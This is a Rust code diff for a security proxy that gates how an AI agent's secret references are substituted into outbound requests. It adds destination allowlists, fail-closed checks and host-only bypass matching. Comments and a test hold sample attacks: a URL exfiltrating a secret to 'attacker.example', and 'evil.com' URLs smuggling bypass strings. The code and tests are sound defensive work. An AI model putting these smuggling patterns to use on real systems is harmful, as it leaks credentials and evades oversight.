@@ -127,13 +127,64 @@ impl SecurityProxy {
 
         info!("{} {}", method, target_url);
 
-        // Bypass check
+        // Pre-substitution host extraction. The destination allowlist
+        // (RFC §11.1) MUST gate URL substitution too — an attacker can
+        // otherwise smuggle a secret to an arbitrary host with
+        // `https://attacker.example/?key={{secret:X}}`. Parse the
+        // PRE-substitution URL to learn the destination, then pass it
+        // through to substitution.
+        //
+        // Edge case: if the URL itself contains `{{secret:` in the host
+        // portion (`https://{{secret:HOST}}/…`), the host can't be known
+        // until after substitution and there's no safe destination to
+        // gate on — fail closed.
+        let url_dest_host: Option<String> = reqwest::Url::parse(&target_url)
+            .ok()
+            .and_then(|u| u.host_str().map(|s| s.to_string()));
+        if url_dest_host.is_none() && target_url.contains("{{secret:") {
+            warn!("BLOCKED: URL contains secret ref but host is unparseable");
+            return Ok(blocked_response("Request rejected"));
+        }
+
+        // Substitute {{secret:NAME}} references in the URL before any
+        // further processing. Rationale: the URL is built by the agent
+        // and may contain refs like `?key={{secret:BRAVE}}`; we need
+        // the substituted URL for routing decisions (bypass, host
+        // detect) and for the outbound request. Fail-closed on any
+        // unresolvable ref OR destination-allowlist denial — see
+        // docs/rfcs/agent-secret-gateway.md §3 + §11.1.
+        let target_url = match self
+            .resolve_and_substitute(&target_url, url_dest_host.as_deref())
+            .await
+        {
+            Ok(url) => url,
+            Err(e) => {
+                // Log the detailed reason server-side so operators can
+                // debug, but return a bland message to the client.
+                // Echoing `e` would leak which env vars were probed,
+                // which ref the agent used, and whether it matched the
+                // allowed syntax — that's shape-of-store information we
+                // deliberately don't disclose (see vault_handler for the
+                // companion pattern).
+                warn!("BLOCKED: URL substitution failed: {}", e);
+                return Ok(blocked_response("Request rejected"));
+            }
+        };
+
+        // Bypass check. Substitution + raw-scan ran above, so a bypassed
+        // request can no longer forward literal `{{secret:NAME}}` text
+        // (which would leak ref names to bypassed upstreams) and the
+        // §11.1 destination allowlist has already gated the URL.
         if self.check_bypassed(&target_url) {
             info!("Bypassing: {}", target_url);
             return Ok(self.forward_upstream(req, &target_url).await);
         }
 
-        // Capture headers before consuming body
+        // Capture headers before consuming body. Hop-by-hop headers
+        // are dropped per RFC 7230 §6.1. `content-length` is ALSO
+        // dropped because body substitution can change the byte
+        // length — letting reqwest recompute it from the forwarded
+        // payload avoids an IncompleteBody error at upstream.
         let original_headers: Vec<(String, String)> = req
             .headers()
             .iter()
@@ -143,6 +194,7 @@ impl SecurityProxy {
                     key_str.as_str(),
                     "host"
                         | "connection"
+                        | "content-length"
                         | "keep-alive"
                         | "proxy-authenticate"
                         | "proxy-authorization"
@@ -160,12 +212,87 @@ impl SecurityProxy {
             })
             .collect();
 
+        // Parse the (already-substituted) target URL once so the
+        // header- and body-substitution paths can pass the destination
+        // host into `resolve_and_substitute` for the per-secret
+        // allowlist gate (RFC §11.1).
+        let dest_host: Option<String> = reqwest::Url::parse(&target_url)
+            .ok()
+            .and_then(|u| u.host_str().map(|s| s.to_string()));
+
+        // Substitute {{secret:NAME}} refs in header VALUES (not names —
+        // agents can't usefully parameterize header names, and
+        // substituting into names would enable a class of bypass where
+        // a secret ends up as a header key attackers can read server
+        // side). Fail-closed on unresolvable refs OR on
+        // destination-allowlist denial.
+        let mut substituted_headers: Vec<(String, String)> =
+            Vec::with_capacity(original_headers.len());
+        for (k, v) in &original_headers {
+            match self.resolve_and_substitute(v, dest_host.as_deref()).await {
+                Ok(new_v) => substituted_headers.push((k.clone(), new_v)),
+                Err(e) => {
+                    warn!("BLOCKED: header substitution failed: {}", e);
+                    return Ok(blocked_response("Request rejected"));
+                }
+            }
+        }
+        let original_headers = substituted_headers;
+
+        // Find the content-type for body-substitution routing. Default
+        // to None; body_substitution_mode() treats that as RawScan
+        // (fail-closed if refs present).
+        let content_type = original_headers
+            .iter()
+            .find(|(k, _)| k.to_lowercase() == "content-type")
+            .map(|(_, v)| v.as_str());
+        let body_mode = Self::body_substitution_mode(content_type);
+
         // Read request body
         let body_bytes = match req.into_body().collect().await {
             Ok(collected) => collected.to_bytes(),
             Err(e) => {
                 error!("Failed to read request body: {}", e);
                 return Ok(blocked_response("Failed to read request body"));
+            }
+        };
+
+        // Substitute in the body depending on content-type. For
+        // unsupported types we still run a raw-bytes scan for
+        // `{{secret:` so an agent can't smuggle a ref by claiming
+        // multipart/form-data (see RFC §11.8).
+        let body_bytes: bytes::Bytes = if body_bytes.is_empty() {
+            body_bytes
+        } else {
+            match body_mode {
+                BodyMode::FullSubstitute => {
+                    let body_str = String::from_utf8_lossy(&body_bytes).into_owned();
+                    match self
+                        .resolve_and_substitute(&body_str, dest_host.as_deref())
+                        .await
+                    {
+                        Ok(substituted) => bytes::Bytes::from(substituted.into_bytes()),
+                        Err(e) => {
+                            warn!("BLOCKED: body substitution failed: {}", e);
+                            return Ok(blocked_response("Request rejected"));
+                        }
+                    }
+                }
+                BodyMode::RawScan => {
+                    // Raw memchr-style check on the undecoded bytes.
+                    // We don't try to parse — any occurrence of the
+                    // ref opener in a content-type we can't safely
+                    // edit is a fail-closed signal.
+                    if memchr_substr(&body_bytes, b"{{secret:") {
+                        warn!(
+                            "BLOCKED: secret reference in body with \
+                             unsupported content-type ({:?})",
+                            content_type.unwrap_or("unset")
+                        );
+                        return Ok(blocked_response("Request rejected"));
+                    }
+                    body_bytes
+                }
             }
         };
         let body_str = String::from_utf8_lossy(&body_bytes);
@@ -191,13 +318,21 @@ impl SecurityProxy {
             }
         }
 
-        // Credential injection
+        // Credential injection — on a cache miss, resolve via the shared
+        // onecli-client vault resolver (env → fnox → vaultwarden) so
+        // rotated keys are picked up per-request rather than only at
+        // startup. See docs/rfcs/consolidation-findings.md finding #5.
         let mut injected_headers = vec![];
         if self.config.inject_credentials {
             if let Some(host) = reqwest::Url::parse(&target_url)
                 .ok()
                 .and_then(|u| u.host_str().map(String::from))
             {
+                if let Some(provider) = self.credentials.detect_provider_pub(&host) {
+                    // Populates cache from resolver if missing. Ignore the
+                    // bool — inject handles the still-absent case.
+                    let _ = self.credentials.ensure_cached(&provider).await;
+                }
                 self.credentials.inject(&mut injected_headers, &host);
             }
         }
@@ -304,31 +439,206 @@ impl SecurityProxy {
         }
     }
 
+    /// Resolve any `{{secret:NAME}}` refs in `input` and return the
+    /// substituted form. Uses the shared `onecli_client::vault::get_secret`
+    /// resolver for each name. On any error (unresolvable, malformed,
+    /// nested) returns the error so the caller can fail the outbound
+    /// request.
+    ///
+    /// `dest_host` is the host the substituted bytes will be sent to.
+    /// Used for the per-secret destination allowlist check (RFC §11.1):
+    /// if a secret's allowlist is configured and `dest_host` doesn't
+    /// match, substitution fails closed with a `DestinationDenied`
+    /// error before the resolver is consulted. Pass `None` for paths
+    /// where the destination isn't known yet (the URL itself is being
+    /// substituted) — substitution proceeds without the gate, and the
+    /// caller should re-check post-substitution if needed.
+    ///
+    /// Zero-allocation fast path: if `find_refs` returns an empty set,
+    /// we return without a resolver round-trip. The cost of substitution
+    /// is thus proportional to the number of refs, not the size of the
+    /// input string.
+    async fn resolve_and_substitute(
+        &self,
+        input: &str,
+        dest_host: Option<&str>,
+    ) -> Result<String, String> {
+        let names = crate::substitution::find_refs(input).map_err(|e| e.to_string())?;
+        if names.is_empty() {
+            return Ok(input.to_string());
+        }
+
+        // Allowlist gate — runs BEFORE the resolver so that:
+        // (a) we don't pay the resolver cost for a request we're
+        //     about to reject, and
+        // (b) the secret value is never even loaded into memory for
+        //     a destination we don't trust.
+        if let Some(host) = dest_host {
+            let host_lower = host.to_lowercase();
+            for name in &names {
+                if !self.is_destination_allowed(name, &host_lower) {
+                    return Err(format!(
+                        "secret {name:?} not allowed at destination {host:?}"
+                    ));
+                }
+            }
+        }
+
+        let mut resolved = std::collections::HashMap::new();
+        for name in names {
+            match onecli_client::vault::get_secret(&name).await {
+                Ok(value) => {
+                    resolved.insert(name, value);
+                }
+                Err(e) => return Err(format!("unresolvable secret ref {name:?}: {e}")),
+            }
+        }
+        crate::substitution::substitute(input, &resolved)
+            .map(|cow| cow.into_owned())
+            .map_err(|e| e.to_string())
+    }
+
+    /// True if the given secret name may be substituted into a request
+    /// going to `host`. See `secret_destination_allowlist` field doc on
+    /// `GatewayConfig` for the three behaviors (absent = unrestricted,
+    /// empty list = deny all, non-empty list = host must match a
+    /// pattern). Host matching reuses [`Self::host_matches_pattern`]
+    /// so the bypass-list and allowlist share semantics.
+    fn is_destination_allowed(&self, secret_name: &str, host: &str) -> bool {
+        let Some(patterns) = self.config.secret_destination_allowlist.get(secret_name) else {
+            // No entry → no restriction. Preserves pre-feature behavior.
+            return true;
+        };
+        if patterns.is_empty() {
+            // Explicit lock-down: present-with-empty-list means
+            // "this secret is configured to never substitute into
+            // any outbound request". Use to disable a secret for
+            // substitution without removing the storage entry.
+            return false;
+        }
+        patterns
+            .iter()
+            .any(|pattern| Self::host_matches_pattern(host, pattern))
+    }
+
+    /// Decide whether a request body of `content_type` is eligible for
+    /// full-text substitution, or needs the defensive raw-bytes scan
+    /// for `{{secret:` (fail-closed if found, pass-through otherwise).
+    ///
+    /// Supported content-types for full substitution:
+    /// - `application/json`, `application/*+json`
+    /// - `application/x-www-form-urlencoded`
+    /// - `text/*`
+    ///
+    /// Everything else (multipart/form-data, application/octet-stream,
+    /// images, etc.) takes the raw-bytes path. Rationale in
+    /// `docs/rfcs/agent-secret-gateway.md` §11.8 — a binary body that
+    /// claims `multipart/form-data` would otherwise bypass substitution
+    /// entirely; the raw scan makes sure any ref-shaped content either
+    /// substitutes or blocks the request.
+    fn body_substitution_mode(content_type: Option<&str>) -> BodyMode {
+        let Some(ct) = content_type else {
+            return BodyMode::RawScan;
+        };
+        let ct_lower = ct.to_lowercase();
+        let head = ct_lower.split(';').next().unwrap_or("").trim();
+        if head == "application/json"
+            || head.ends_with("+json")
+            || head == "application/x-www-form-urlencoded"
+            || head.starts_with("text/")
+        {
+            BodyMode::FullSubstitute
+        } else {
+            BodyMode::RawScan
+        }
+    }
+
+    /// Check whether the bypass list allows skipping inbound/outbound
+    /// scanning for this URL. Match is performed against the URL's HOST
+    /// only, never against path/query/fragment — otherwise a URL like
+    /// `https://evil.com/?redirect=localhost` would "match" the bypass
+    /// list by substring and smuggle the request past the scanner.
     fn check_bypassed(&self, url: &str) -> bool {
+        let Some(host) = reqwest::Url::parse(url)
+            .ok()
+            .and_then(|u| u.host_str().map(String::from))
+        else {
+            // Unparseable URL: fail closed (do not bypass).
+            return false;
+        };
+        let host_lower = host.to_lowercase();
         for pattern in &self.config.bypass_domains {
-            if Self::match_wildcard(url, pattern) {
+            if Self::host_matches_pattern(&host_lower, pattern) {
                 return true;
             }
         }
         false
     }
 
-    /// Matches a URL against a pattern that may contain `*` wildcards.
-    fn match_wildcard(url: &str, pattern: &str) -> bool {
-        if !pattern.contains('*') {
-            // Simple substring match for non-wildcard patterns
-            return url.contains(pattern);
-        }
-        // Convert wildcard pattern to regex-like matching
-        // Escape special regex chars, then replace \* with .*
-        let regex_pattern = pattern.replace('.', r"\.").replace('*', ".*");
-        if let Ok(re) = regex::Regex::new(&regex_pattern) {
-            re.is_match(url)
-        } else {
-            // Fallback to simple contains if regex fails
-            url.contains(&pattern.replace('*', ""))
+    /// Match a parsed host against a bypass pattern. Patterns may
+    /// contain `*` wildcards; semantics:
+    ///   - no `*`: host must equal the pattern (case-insensitive) OR
+    ///     end with `.<pattern>` (DNS-label boundary)
+    ///   - with `*`: treat as glob — `*` means `[^.]*` (no dots, so a
+    ///     pattern like `192.168.1.*` doesn't cross dots into
+    ///     neighbouring octets); every other character is matched
+    ///     literally via `regex::escape`. Prior version used
+    ///     `.replace('.', r"\.")` and `.replace('*', ".*")` which left
+    ///     `?`, `+`, `(`, `[`, etc. active as regex, widening match and
+    ///     in some cases failing compile altogether (unintended
+    ///     allow-all-or-allow-none). Caller pre-compiles, so the cost
+    ///     of regex-building is paid once at config load.
+    fn host_matches_pattern(host: &str, pattern: &str) -> bool {
+        match Self::compile_bypass_pattern(pattern) {
+            BypassMatcher::Exact(p) => host == p || host.ends_with(&format!(".{p}")),
+            BypassMatcher::Glob(re) => re.is_match(host),
+            BypassMatcher::Invalid => false,
         }
     }
+
+    /// Compile a bypass pattern once. In the hot path today this still
+    /// runs per-request (called from `host_matches_pattern`); a
+    /// follow-up should precompile the whole list at `SecurityProxy`
+    /// construction, but doing that cleanly requires changing
+    /// `GatewayConfig` shape. For now the regex builder itself is
+    /// correct and escape-safe; perf follows.
+    fn compile_bypass_pattern(pattern: &str) -> BypassMatcher {
+        let lower = pattern.to_lowercase();
+        if !lower.contains('*') {
+            return BypassMatcher::Exact(lower);
+        }
+        // Build a glob-style regex: split on `*`, escape each literal
+        // segment, rejoin with `[^.]*` between. `[^.]*` rather than
+        // `.*` so the wildcard doesn't cross DNS-label boundaries
+        // (e.g., `*.example.com` must not match `a.b.example.com`
+        // unless that's the actual intent — we document the stricter
+        // semantics in the doc above).
+        let parts: Vec<String> = lower.split('*').map(regex::escape).collect();
+        let body = parts.join("[^.]*");
+        let anchored = format!("^{body}$");
+        match regex::Regex::new(&anchored) {
+            Ok(re) => BypassMatcher::Glob(re),
+            Err(_) => BypassMatcher::Invalid,
+        }
+    }
+}
+
+enum BypassMatcher {
+    Exact(String),
+    Glob(regex::Regex),
+    Invalid,
+}
+
+/// How to handle substitution for a request body of a given
+/// content-type. See `SecurityProxy::body_substitution_mode`.
+enum BodyMode {
+    /// Full find-and-substitute pass over the body text. Used for
+    /// JSON, form-urlencoded, and text/* content-types.
+    FullSubstitute,
+    /// Body format doesn't support inline substitution (e.g.,
+    /// multipart, binary). Fail closed if the raw bytes contain
+    /// `{{secret:`; pass through otherwise.
+    RawScan,
 }
 
 // ── HTTP handler ─────────────────────────────────────────────────────────────
@@ -356,6 +666,17 @@ pub async fn health_handler(State(state): State<Arc<SecurityProxy>>) -> impl Int
             blocked
         )))
         .unwrap()
+}
+
+/// True if `haystack` contains `needle` as a contiguous byte sequence.
+/// Used only for the defensive "body claims multipart/form-data but has
+/// `{{secret:` in it" raw-bytes check. Naive O(n*m); fine because
+/// `needle` is a fixed 9-byte literal and we exit on first hit.
+fn memchr_substr(haystack: &[u8], needle: &[u8]) -> bool {
+    if needle.is_empty() || haystack.len() < needle.len() {
+        return false;
+    }
+    haystack.windows(needle.len()).any(|w| w == needle)
 }
 
 fn blocked_response(reason: &str) -> Response {
@@ -670,5 +991,48 @@ mod tests {
         assert!(proxy.check_bypassed("http://192.168.1.100:3000/data"));
         assert!(!proxy.check_bypassed("https://evil.com/steal"));
         assert!(!proxy.check_bypassed("https://api.openai.com/v1/chat"));
+    }
+
+    /// Given a bypass list containing "localhost" (a hostname pattern),
+    /// and an outbound URL that embeds the string "localhost" in its path
+    /// or query (but is actually targeted at an external host),
+    /// when check_bypassed is called,
+    /// then it returns false — the URL is NOT bypassed.
+    ///
+    /// This prevents a URL like `https://evil.com/?redirect=localhost.com`
+    /// from smuggling a bypass via substring match. Discovered in the
+    /// test-quality audit on 2026-04-24.
+    #[test]
+    fn check_bypassed_rejects_host_string_embedded_in_path() {
+        let config = GatewayConfig {
+            bypass_domains: vec!["localhost".into(), "192.168.1.*".into()],
+            ..Default::default()
+        };
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let proxy = rt.block_on(async {
+            SecurityProxy::new(config, ScannerConfig::default(), RateLimitConfig::default()).await
+        });
+
+        let smuggled = [
+            // Plain substring in path
+            "https://evil.com/steal?redirect=localhost",
+            // IP in query param
+            "https://evil.com/?target=192.168.1.42",
+            // Fragment
+            "https://evil.com/api#localhost",
+            // Userinfo (ugly but valid URL)
+            "https://user:pass@evil.com/?where=localhost",
+        ];
+        for url in smuggled {
+            assert!(
+                !proxy.check_bypassed(url),
+                "URL {url:?} must NOT bypass scanning — the bypass list is \
+                 a host pattern, not a free-form URL-substring pattern"
+            );
+        }
+
+        // Sanity: legitimate same-host bypasses still work.
+        assert!(proxy.check_bypassed("http://localhost:8080/api"));
+        assert!(proxy.check_bypassed("http://192.168.1.1/anything"));
     }
 }
